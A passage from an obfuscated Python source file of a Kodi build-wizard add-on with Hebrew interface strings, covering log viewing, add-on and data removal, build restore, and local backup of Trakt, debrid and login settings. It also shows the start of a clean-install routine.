			OOOO0O0000O0OO000 .getControl (OOOO0O0000O0OO000 .title ).setLabel (OOOO0O0000O0OO000 .titlemsg )#line:4982
			OOOO0O0000O0OO000 .getControl (OOOO0O0000O0OO000 .msg ).setText (wiz .highlightText (OOOO0O0000O0OO000 .logmsg ))#line:4983
			OOOO0O0000O0OO000 .setFocusId (OOOO0O0000O0OO000 .scrollbar )#line:4984
		def onClick (OO000O0OO000OOOOO ,OOOO00O00000000O0 ):#line:4986
			if OOOO00O00000000O0 ==OO000O0OO000OOOOO .okbutton :OO000O0OO000OOOOO .close ()#line:4987
			elif OOOO00O00000000O0 ==OO000O0OO000OOOOO .upload :OO000O0OO000OOOOO .close ();uploadLog .Main ()#line:4988
			elif OOOO00O00000000O0 ==OO000O0OO000OOOOO .kodi :#line:4989
				O0OO0000O00O00OOO =wiz .Grab_Log (False )#line:4990
				OO0OO000O00OO0OOO =wiz .Grab_Log (True )#line:4991
				if O0OO0000O00O00OOO ==False :#line:4992
					OO000O0OO000OOOOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4993
					OO000O0OO000OOOOO .getControl (OO000O0OO000OOOOO .msg ).setText ("Log File Does Not Exists!")#line:4994
				else :#line:4995
					OO000O0OO000OOOOO .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OO000O00OO0OOO .replace (LOG ,''))#line:4996
					OO000O0OO000OOOOO .getControl (OO000O0OO000OOOOO .title ).setLabel (OO000O0OO000OOOOO .titlemsg )#line:4997
					OO000O0OO000OOOOO .getControl (OO000O0OO000OOOOO .msg ).setText (wiz .highlightText (O0OO0000O00O00OOO ))#line:4998
					OO000O0OO000OOOOO .setFocusId (OO000O0OO000OOOOO .scrollbar )#line:4999
			elif OOOO00O00000000O0 ==OO000O0OO000OOOOO .kodiold :#line:5000
				O0OO0000O00O00OOO =wiz .Grab_Log (False ,True )#line:5001
				OO0OO000O00OO0OOO =wiz .Grab_Log (True ,True )#line:5002
				if O0OO0000O00O00OOO ==False :#line:5003
					OO000O0OO000OOOOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:5004
					OO000O0OO000OOOOO .getControl (OO000O0OO000OOOOO .msg ).setText ("Log File Does Not Exists!")#line:5005
				else :#line:5006
					OO000O0OO000OOOOO .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OO000O00OO0OOO .replace (LOG ,''))#line:5007
					OO000O0OO000OOOOO .getControl (OO000O0OO000OOOOO .title ).setLabel (OO000O0OO000OOOOO .titlemsg )#line:5008
					OO000O0OO000OOOOO .getControl (OO000O0OO000OOOOO .msg ).setText (wiz .highlightText (O0OO0000O00O00OOO ))#line:5009
					OO000O0OO000OOOOO .setFocusId (OO000O0OO000OOOOO .scrollbar )#line:5010
			elif OOOO00O00000000O0 ==OO000O0OO000OOOOO .wizard :#line:5011
				O0OO0000O00O00OOO =wiz .Grab_Log (False ,False ,True )#line:5012
				OO0OO000O00OO0OOO =wiz .Grab_Log (True ,False ,True )#line:5013
				if O0OO0000O00O00OOO ==False :#line:5014
					OO000O0OO000OOOOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:5015
					OO000O0OO000OOOOO .getControl (OO000O0OO000OOOOO .msg ).setText ("Log File Does Not Exists!")#line:5016
				else :#line:5017
					OO000O0OO000OOOOO .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OO000O00OO0OOO .replace (ADDONDATA ,''))#line:5018
					OO000O0OO000OOOOO .getControl (OO000O0OO000OOOOO .title ).setLabel (OO000O0OO000OOOOO .titlemsg )#line:5019
					OO000O0OO000OOOOO .getControl (OO000O0OO000OOOOO .msg ).setText (wiz .highlightText (O0OO0000O00O00OOO ))#line:5020
					OO000O0OO000OOOOO .setFocusId (OO000O0OO000OOOOO .scrollbar )#line:5021
		def onAction (OOO0O0OOOO0000O0O ,O0O0000O0OOO0OO00 ):#line:5023
			if O0O0000O0OOO0OO00 ==ACTION_PREVIOUS_MENU :OOO0O0OOOO0000O0O .close ()#line:5024
			elif O0O0000O0OOO0OO00 ==ACTION_NAV_BACK :OOO0O0OOOO0000O0O .close ()#line:5025
	if default ==None :default =wiz .Grab_Log (True )#line:5026
	OO00O000OO0O00000 =O0O00000O0OOO0OOO ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:5027
	OO00O000OO0O00000 .doModal ()#line:5028
	del OO00O000OO0O00000 #line:5029
def removeAddon (OO0OOOOO00O0OOOOO ,O0OO0O00OOOO00000 ,over =False ):#line:5031
	if not over ==False :#line:5032
		OO00O000O0O00OO00 =1 #line:5033
	else :#line:5034
		OO00O000O0O00OO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO0O00OOOO00000 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OO0OOOOO00O0OOOOO ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:5035
	if OO00O000O0O00OO00 ==1 :#line:5036
		OO0OO00O0O0O0O000 =os .path .join (ADDONS ,OO0OOOOO00O0OOOOO )#line:5037
		wiz .log ("Removing Addon %s"%OO0OOOOO00O0OOOOO )#line:5038
		wiz .cleanHouse (OO0OO00O0O0O0O000 )#line:5039
		xbmc .sleep (1000 )#line:5040
		try :shutil .rmtree (OO0OO00O0O0O0O000 )#line:5041
		except Exception as O0OOO0O00000O000O :wiz .log ("Error removing %s"%OO0OOOOO00O0OOOOO ,xbmc .LOGNOTICE )#line:5042
		removeAddonData (OO0OOOOO00O0OOOOO ,O0OO0O00OOOO00000 ,over )#line:5043
	if over ==False :#line:5044
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O0OO0O00OOOO00000 ))#line:5045
def removeAddonData (OOO00O0O0OO0O0OOO ,name =None ,over =False ):#line:5047
	if OOO00O0O0OO0O0OOO =='all':#line:5048
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5049
			wiz .cleanHouse (ADDOND )#line:5050
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5051
	elif OOO00O0O0OO0O0OOO =='uninstalled':#line:5052
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5053
			O00OOO0O0OO0O0O00 =0 #line:5054
			for O0OO0O0O0O0O0000O in glob .glob (os .path .join (ADDOND ,'*')):#line:5055
				O00OOO00OO0O00O0O =O0OO0O0O0O0O0000O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:5056
				if O00OOO00OO0O00O0O in EXCLUDES :pass #line:5057
				elif os .path .exists (os .path .join (ADDONS ,O00OOO00OO0O00O0O )):pass #line:5058
				else :wiz .cleanHouse (O0OO0O0O0O0O0000O );O00OOO0O0OO0O0O00 +=1 ;wiz .log (O0OO0O0O0O0O0000O );shutil .rmtree (O0OO0O0O0O0O0000O )#line:5059
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O00OOO0O0OO0O0O00 ))#line:5060
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5061
	elif OOO00O0O0OO0O0OOO =='empty':#line:5062
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5063
			O00OOO0O0OO0O0O00 =wiz .emptyfolder (ADDOND )#line:5064
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O00OOO0O0OO0O0O00 ))#line:5065
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:5066
	else :#line:5067
		O000O0OO0OO00000O =os .path .join (USERDATA ,'addon_data',OOO00O0O0OO0O0OOO )#line:5068
		if OOO00O0O0OO0O0OOO in EXCLUDES :#line:5069
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:5070
		elif os .path .exists (O000O0OO0OO00000O ):#line:5071
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO00O0O0OO0O0OOO ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:5072
				wiz .cleanHouse (O000O0OO0OO00000O )#line:5073
				try :#line:5074
					shutil .rmtree (O000O0OO0OO00000O )#line:5075
				except :#line:5076
					wiz .log ("Error deleting: %s"%O000O0OO0OO00000O )#line:5077
			else :#line:5078
				wiz .log ('Addon data for %s was not removed'%OOO00O0O0OO0O0OOO )#line:5079
	wiz .refresh ()#line:5080
def restoreit (O0O0000OO00OO0O00 ):#line:5082
	if O0O0000OO00OO0O00 =='build':#line:5083
		OO0000O0000O0000O =freshStart ('restore')#line:5084
		if OO0000O0000O0000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:5085
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.Premium.mod']:#line:5086
		wiz .skinToDefault ()#line:5087
	wiz .restoreLocal (O0O0000OO00OO0O00 )#line:5088
def restoreextit (O0O0OO0OOO00000OO ):#line:5090
	if O0O0OO0OOO00000OO =='build':#line:5091
		OO0OO0000OOOO0000 =freshStart ('restore')#line:5092
		if OO0OO0000OOOO0000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:5093
	wiz .restoreExternal (O0O0OO0OOO00000OO )#line:5094
def buildInfo (O00O00O00O0O0OO0O ):#line:5096
	if wiz .workingURL (SPEEDFILE )==True :#line:5097
		if wiz .checkBuild (O00O00O00O0O0OO0O ,'url'):#line:5098
			O00O00O00O0O0OO0O ,OOO0OO000O0OO0000 ,OOO0OOO0OO0OO0000 ,OO000000000O00OO0 ,O00OOO0OOO0O0O0OO ,OOOOO00O0O00O00OO ,OOO000OOO0O0000O0 ,OO00O0OO0OO00000O ,OOO0OOOO000O00OO0 ,OO0OOO0000O0OO0OO ,OOOOOO000OO0OO0OO =wiz .checkBuild (O00O00O00O0O0OO0O ,'all')#line:5099
			OO0OOO0000O0OO0OO ='Yes'if OO0OOO0000O0OO0OO .lower ()=='yes'else 'No'#line:5100
			OO00O0000OO0000OO ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O00O00O0O0OO0O )#line:5101
			OO00O0000OO0000OO +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0OO000O0OO0000 )#line:5102
			if not OOOOO00O0O00O00OO =="http://":#line:5103
				OOOOOO0OOO000O000 =wiz .themeCount (O00O00O00O0O0OO0O ,False )#line:5104
				OO00O0000OO0000OO +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OOOOOO0OOO000O000 ))#line:5105
			OO00O0000OO0000OO +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00OOO0OOO0O0O0OO )#line:5106
			OO00O0000OO0000OO +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0OOO0000O0OO0OO )#line:5107
			OO00O0000OO0000OO +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOOO000OO0OO0OO )#line:5108
			wiz .TextBox (ADDONTITLE ,OO00O0000OO0000OO )#line:5109
		else :wiz .log ("Invalid Build Name!")#line:5110
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5111
def buildVideo (OO0O0O00O0O00O000 ):#line:5113
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:5114
	if wiz .workingURL (SPEEDFILE )==True :#line:5115
		OO0OOO00O0OO00OO0 =wiz .checkBuild (OO0O0O00O0O00O000 ,'preview')#line:5116
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OO0O0O00O0O00O000 )#line:5117
		if OO0OOO00O0OO00OO0 and not OO0OOO00O0OO00OO0 =='http://':playVideo (OO0OOO00O0OO00OO0 )#line:5118
		else :wiz .log ("[%s]Unable to find url for video preview"%OO0O0O00O0O00O000 )#line:5119
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:5120
def dependsList (O00OOO0OO00O000OO ):#line:5122
	O000O0O00000O0000 =os .path .join (ADDONS ,O00OOO0OO00O000OO ,'addon.xml')#line:5123
	if os .path .exists (O000O0O00000O0000 ):#line:5124
		O00O0OO000O0O0OOO =open (O000O0O00000O0000 ,mode ='r');O0OOOOO000O0O0000 =O00O0OO000O0O0OOO .read ();O00O0OO000O0O0OOO .close ();#line:5125
		O00OO0O0O0O00OOOO =wiz .parseDOM (O0OOOOO000O0O0000 ,'import',ret ='addon')#line:5126
		OOOOO000O000OOOOO =[]#line:5127
		for OO0O0O00O0O00O0OO in O00OO0O0O0O00OOOO :#line:5128
			if not 'xbmc.python'in OO0O0O00O0O00O0OO :#line:5129
				OOOOO000O000OOOOO .append (OO0O0O00O0O00O0OO )#line:5130
		return OOOOO000O000OOOOO #line:5131
	return []#line:5132
def manageSaveData (OO000O00O0OOOO000 ):#line:5134
	if OO000O00O0OOOO000 =='import':#line:5135
		O000000O0O0OOO000 =os .path .join (ADDONDATA ,'temp')#line:5136
		if not os .path .exists (O000000O0O0OOO000 ):os .makedirs (O000000O0O0OOO000 )#line:5137
		OO00O0O0000OO000O =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:5138
		if not OO00O0O0000OO000O .endswith ('.zip'):#line:5139
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:5140
			return #line:5141
		O0O00O0OOO00000OO =os .path .join (MYBUILDS ,'SaveData.zip')#line:5142
		O0OOO00O000O0O0O0 =xbmcvfs .copy (OO00O0O0000OO000O ,O0O00O0OOO00000OO )#line:5143
		wiz .log ("%s"%str (O0OOO00O000O0O0O0 ))#line:5144
		extract .all (xbmc .translatePath (O0O00O0OOO00000OO ),O000000O0O0OOO000 )#line:5145
		OO00O0O00OO0O0O0O =os .path .join (O000000O0O0OOO000 ,'trakt')#line:5146
		OOO00O00000000OOO =os .path .join (O000000O0O0OOO000 ,'login')#line:5147
		OOO0O0O0OO000O000 =os .path .join (O000000O0O0OOO000 ,'debrid')#line:5148
		O00OO0000OO000O0O =0 #line:5149
		if os .path .exists (OO00O0O00OO0O0O0O ):#line:5150
			O00OO0000OO000O0O +=1 #line:5151
			OO0OOO00OO0OO0OO0 =os .listdir (OO00O0O00OO0O0O0O )#line:5152
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:5153
			for OO0O0O000OOO00O0O in OO0OOO00OO0OO0OO0 :#line:5154
				O0O00O0OOO0OOOOO0 =os .path .join (traktit .TRAKTFOLD ,OO0O0O000OOO00O0O )#line:5155
				OO0O0OO0O00O0O0OO =os .path .join (OO00O0O00OO0O0O0O ,OO0O0O000OOO00O0O )#line:5156
				if os .path .exists (O0O00O0OOO0OOOOO0 ):#line:5157
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0O0O000OOO00O0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5158
					else :os .remove (O0O00O0OOO0OOOOO0 )#line:5159
				shutil .copy (OO0O0OO0O00O0O0OO ,O0O00O0OOO0OOOOO0 )#line:5160
			traktit .importlist ('all')#line:5161
			traktit .traktIt ('restore','all')#line:5162
		if os .path .exists (OOO00O00000000OOO ):#line:5163
			O00OO0000OO000O0O +=1 #line:5164
			OO0OOO00OO0OO0OO0 =os .listdir (OOO00O00000000OOO )#line:5165
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:5166
			for OO0O0O000OOO00O0O in OO0OOO00OO0OO0OO0 :#line:5167
				O0O00O0OOO0OOOOO0 =os .path .join (loginit .LOGINFOLD ,OO0O0O000OOO00O0O )#line:5168
				OO0O0OO0O00O0O0OO =os .path .join (OOO00O00000000OOO ,OO0O0O000OOO00O0O )#line:5169
				if os .path .exists (O0O00O0OOO0OOOOO0 ):#line:5170
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0O0O000OOO00O0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5171
					else :os .remove (O0O00O0OOO0OOOOO0 )#line:5172
				shutil .copy (OO0O0OO0O00O0O0OO ,O0O00O0OOO0OOOOO0 )#line:5173
			loginit .importlist ('all')#line:5174
			loginit .loginIt ('restore','all')#line:5175
		if os .path .exists (OOO0O0O0OO000O000 ):#line:5176
			O00OO0000OO000O0O +=1 #line:5177
			OO0OOO00OO0OO0OO0 =os .listdir (OOO0O0O0OO000O000 )#line:5178
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:5179
			for OO0O0O000OOO00O0O in OO0OOO00OO0OO0OO0 :#line:5180
				O0O00O0OOO0OOOOO0 =os .path .join (debridit .REALFOLD ,OO0O0O000OOO00O0O )#line:5181
				OO0O0OO0O00O0O0OO =os .path .join (OOO0O0O0OO000O000 ,OO0O0O000OOO00O0O )#line:5182
				if os .path .exists (O0O00O0OOO0OOOOO0 ):#line:5183
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0O0O000OOO00O0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:5184
					else :os .remove (O0O00O0OOO0OOOOO0 )#line:5185
				shutil .copy (OO0O0OO0O00O0O0OO ,O0O00O0OOO0OOOOO0 )#line:5186
			debridit .importlist ('all')#line:5187
			debridit .debridIt ('restore','all')#line:5188
		wiz .cleanHouse (O000000O0O0OOO000 )#line:5189
		wiz .removeFolder (O000000O0O0OOO000 )#line:5190
		os .remove (O0O00O0OOO00000OO )#line:5191
		if O00OO0000OO000O0O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:5192
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:5193
	elif OO000O00O0OOOO000 =='export':#line:5194
		O00000O0O000O0O00 =xbmc .translatePath (MYBUILDS )#line:5195
		O0O00OO0O00OO000O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:5196
		traktit .traktIt ('update','all')#line:5197
		loginit .loginIt ('update','all')#line:5198
		debridit .debridIt ('update','all')#line:5199
		OO00O0O0000OO000O =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:5200
		OO00O0O0000OO000O =xbmc .translatePath (OO00O0O0000OO000O )#line:5201
		OOO00OOOOOO0OO000 =os .path .join (O00000O0O000O0O00 ,'SaveData.zip')#line:5202
		O0O00O0OO0OO000O0 =zipfile .ZipFile (OOO00OOOOOO0OO000 ,mode ='w')#line:5203
		for O0O00O0OO0O00OO0O in O0O00OO0O00OO000O :#line:5204
			if os .path .exists (O0O00O0OO0O00OO0O ):#line:5205
				OO0OOO00OO0OO0OO0 =os .listdir (O0O00O0OO0O00OO0O )#line:5206
				for O0OO0OO000OOO0OO0 in OO0OOO00OO0OO0OO0 :#line:5207
					O0O00O0OO0OO000O0 .write (os .path .join (O0O00O0OO0O00OO0O ,O0OO0OO000OOO0OO0 ),os .path .join (O0O00O0OO0O00OO0O ,O0OO0OO000OOO0OO0 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:5208
		O0O00O0OO0OO000O0 .close ()#line:5209
		if OO00O0O0000OO000O ==O00000O0O000O0O00 :#line:5210
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00OOOOOO0OO000 ))#line:5211
		else :#line:5212
			try :#line:5213
				xbmcvfs .copy (OOO00OOOOOO0OO000 ,os .path .join (OO00O0O0000OO000O ,'SaveData.zip'))#line:5214
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OO00O0O0000OO000O ,'SaveData.zip')))#line:5215
			except :#line:5216
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO00OOOOOO0OO000 ))#line:5217
def freshStart (install =None ,over =False ):#line:5222
	if USERNAME =='':#line:5223
		ADDON .openSettings ()#line:5224
		sys .exit ()#line:5225
	OO0OOOO000O00O0OO =(SPEEDFILE )#line:5226
	(OO0OOOO000O00O0OO )#line:5227
	O0OO00OOO0OO00000 =(wiz .workingURL (OO0OOOO000O00O0OO ))#line:5228
	(O0OO00OOO0OO00000 )#line:5229
	if KEEPTRAKT =='true':#line:5230
		traktit .autoUpdate ('all')#line:5231
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:5232
	if KEEPREAL =='true':#line:5233
		debridit .autoUpdate ('all')#line:5234
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:5235
	if KEEPLOGIN =='true':#line:5236
		loginit .autoUpdate ('all')#line:5237
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:5238
	if over ==True :O0OO00OO0O000O000 =1 #line:5239
	elif install =='restore':O0OO00OO0O000O000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5240
	elif install :O0OO00OO0O000O000 =1 #line:5241
	else :O0OO00OO0O000O000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:5242
	if O0OO00OO0O000O000 :#line:5243
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5244
			O0OO0O00000O00O00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:5245
			skinSwitch .swapSkins (O0OO0O00000O00O00 )#line:5248
			O000OOO00OO0OO000 =0 #line:5249
			xbmc .sleep (1000 )#line:5250
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000OOO00OO0OO000 <150 :#line:5251
				O000OOO00OO0OO000 +=1 #line:5252
				xbmc .sleep (1000 )#line:5253
				wiz .ebi ('SendAction(Select)')#line:5254
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:5255
				wiz .ebi ('SendClick(11)')#line:5256
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:5257
			xbmc .sleep (1000 )#line:5258
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:5259
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:5260
			return #line:5261
		wiz .addonUpdates ('set')#line:5262
		OO0000O0000OOOO00 =os .path .abspath (HOME )#line:5263
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:5264
		OO0000000OO0O0O0O =sum ([len (OOOOOO0O0O00O000O )for OO0OO0OOO0OO000O0 ,OO00000OO000O0000 ,OOOOOO0O0O00O000O in os .walk (OO0000O0000OOOO00 )]);OOOO0000OO0O00O0O =0 #line:5265
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:5266
		EXCLUDES .append ('My_Builds')#line:5267
		EXCLUDES .append ('archive_cache')#line:5268
		EXCLUDES .append ('script.module.requests')#line:5269
		EXCLUDES .append ('myfav.anon')#line:5270
		if KEEPREPOS =='true':#line:5271
			O0OO0OO0OOO0000OO =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:5272
			for OOOO0000O0OOO0OO0 in O0OO0OO0OOO0000OO :#line:5273
				O0000O00O0OO00000 =os .path .split (OOOO0000O0OOO0OO0 [:-1 ])[1 ]#line:5274
				if not O0000O00O0OO00000 ==EXCLUDES :#line:5275
					EXCLUDES .append (O0000O00O0OO00000 )#line:5276
		if KEEPSUPER =='true':#line:5277
			EXCLUDES .append ('plugin.program.super.favourites')#line:5278
		if KEEPMOVIELIST =='true':#line:5279
			EXCLUDES .append ('plugin.video.metalliq')#line:5280
		if KEEPMOVIELIST =='true':#line:5281
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:5282
		if KEEPADDONS =='true':#line:5283
			EXCLUDES .append ('addons')#line:5284
		if KEEPTELEMEDIA =='true':#line:5285
			EXCLUDES .append ('plugin.video.telemedia')#line:5286
		EXCLUDES .append ('plugin.video.elementum')#line:5291
		EXCLUDES .append ('script.elementum.burst')#line:5292
		EXCLUDES .append ('script.elementum.burst-master')#line:5293
		EXCLUDES .append ('plugin.video.quasar')#line:5294
		EXCLUDES .append ('script.quasar.burst')#line:5295
		EXCLUDES .append ('skin.estuary')#line:5296
		if KEEPWHITELIST =='true':#line:5299
			O0OO00O0O000OOOOO =''#line:5300
			O000OO0O00O00O00O =wiz .whiteList ('read')#line:5301
			if len (O000OO0O00O00O00O )>0 :#line:5302
				for OOOO0000O0OOO0OO0 in O000OO0O00O00O00O :#line:5303
					try :OOOO0O0O00O0O00OO ,OO0O0O0O00O000OO0 ,O000OO0OOOO00O0O0 =OOOO0000O0OOO0OO0 #line:5304
					except :pass #line:5305
					if O000OO0OOOO00O0O0 .startswith ('pvr'):O0OO00O0O000OOOOO =OO0O0O0O00O000OO0 #line:5306
					OOO000O0OOO00O00O =dependsList (O000OO0OOOO00O0O0 )#line:5307
					for OO0OOO00O00O00OO0 in OOO000O0OOO00O00O :#line:5308
						if not OO0OOO00O00O00OO0 in EXCLUDES :#line:5309
							EXCLUDES .append (OO0OOO00O00O00OO0 )#line:5310
						OOOO00O000OOO00OO =dependsList (OO0OOO00O00O00OO0 )#line:5311
						for OO00OO00OOO0O00O0 in OOOO00O000OOO00OO :#line:5312
							if not OO00OO00OOO0O00O0 in EXCLUDES :#line:5313
								EXCLUDES .append (OO00OO00OOO0O00O0 )#line:5314
					if not O000OO0OOOO00O0O0 in EXCLUDES :#line:5315
